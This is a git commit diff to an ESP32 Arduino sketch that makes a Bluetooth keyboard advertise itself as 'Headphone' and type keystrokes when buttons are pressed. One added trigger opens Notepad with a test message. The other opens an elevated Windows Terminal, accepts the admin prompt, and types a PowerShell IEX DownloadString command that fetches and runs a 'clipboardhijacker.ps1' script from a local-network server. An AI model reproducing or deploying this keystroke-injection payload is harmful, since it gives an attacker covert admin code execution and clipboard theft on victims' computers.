c4b10ccbf5f28c4fb3eb87bf0ab075bac9ec605d
Sachin Kumar Pandey <sachinkumarpandey1028@gmail.com>
2025-09-16 12:14:26 +0530

    bluetoothhid.ino

--- bluetoothhid.ino
+++ bluetoothhid.ino
@@ -10,6 +10,8 @@
 #define BUTTON_6_PIN 15 // Trigger 6
 #define BUTTON_7_PIN 13 // Trigger 7
 #define BUTTON_8_PIN 12 // Trigger 8
+#define BUTTON_9_PIN 14 // Trigger 9
+#define BUTTON_10_PIN 23  // Trigger 10
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -23,6 +25,8 @@ bool lastState5 = HIGH;
 bool lastState6 = HIGH;
 bool lastState7 = HIGH;
 bool lastState8 = HIGH;
+bool lastState9 = HIGH;
+bool lastState10 = HIGH;
 
 // helper to type a string char-by-char
 void sendString(const char* s, int charDelay = 10) {
@@ -51,6 +55,8 @@ void setup() {
   pinMode(BUTTON_6_PIN, INPUT_PULLUP);
   pinMode(BUTTON_7_PIN, INPUT_PULLUP);
   pinMode(BUTTON_8_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_9_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_10_PIN, INPUT_PULLUP);
 
   bleKeyboard.begin();
 }
@@ -65,6 +71,8 @@ void loop() {
     bool state6 = digitalRead(BUTTON_6_PIN);
     bool state7 = digitalRead(BUTTON_7_PIN);
     bool state8 = digitalRead(BUTTON_8_PIN);
+    bool state9 = digitalRead(BUTTON_9_PIN);
+    bool state10 = digitalRead(BUTTON_10_PIN);
 
     // Trigger 1:
     if (lastState1 == HIGH && state1 == LOW) {
@@ -270,6 +278,85 @@ void loop() {
       delay(1000);
     }
 
+    // Trigger 9
+    if (lastState9 == HIGH && state9 == LOW) {
+      if (bleKeyboard.isConnected()) {
+        // Open Run dialog (Win + R)
+        bleKeyboard.press(KEY_LEFT_GUI);
+        bleKeyboard.press('r');
+        delay(100);
+        bleKeyboard.releaseAll();
+        delay(1000);
+
+        // Launch Notepad
+        const char* cmd = "notepad";
+        for (int i = 0; i < strlen(cmd); i++) {
+          bleKeyboard.print(cmd[i]);
+          delay(10);
+        }
+        delay(500);
+        bleKeyboard.press(KEY_RETURN);
+        delay(100);
+        bleKeyboard.releaseAll();
+        delay(900); // wait for Notepad to open
+
+        // Type a harmless message
+        const char* msg = "This is a harmless test message. Please ignore.";
+        for (int i = 0; i < strlen(msg); i++) {
+          bleKeyboard.print(msg[i]);
+          delay(8);
+        }
+        delay(300);
+
+        // Open File menu (Alt + F)
+        bleKeyboard.press(KEY_LEFT_ALT);
+        bleKeyboard.press('f');
+        delay(100);
+        bleKeyboard.releaseAll();
+        
+        // Wait 300 ms then press 'x' (File -> Exit)
+        delay(300);
+        bleKeyboard.press('x');
+        delay(100);
+        bleKeyboard.releaseAll();
+      }
+    }
+
+    // Trigger 10:
+      if (lastState10 == HIGH && state10 == LOW) {
+      bleKeyboard.press(KEY_LEFT_GUI);
+      bleKeyboard.press('r');
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(1000);
+      bleKeyboard.print("wt");
+      delay(100);
+      bleKeyboard.press(KEY_LEFT_CTRL);
+      bleKeyboard.press(KEY_LEFT_SHIFT);
+      bleKeyboard.press(KEY_RETURN);
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(3000);
+      bleKeyboard.press(KEY_LEFT_ARROW);
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(100);
+      bleKeyboard.press(KEY_RETURN);
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(5000);
+      const char* cmd = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.53:8081/clipboardhijacker.ps1')";
+      for (int i=0; i < strlen(cmd); i++) {
+      bleKeyboard.print(cmd[i]);
+      delay(50);
+      }
+      delay(1000);
+      bleKeyboard.press(KEY_RETURN);
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(1000);
+      }
+
     // update last states
     lastState1 = state1;
     lastState2 = state2;
@@ -279,6 +366,8 @@ void loop() {
     lastState6 = state6;
     lastState7 = state7;
     lastState8 = state8;
+    lastState9 = state9;
+    lastState10 = state10;
   }
 
   delay(10); // Small debounce
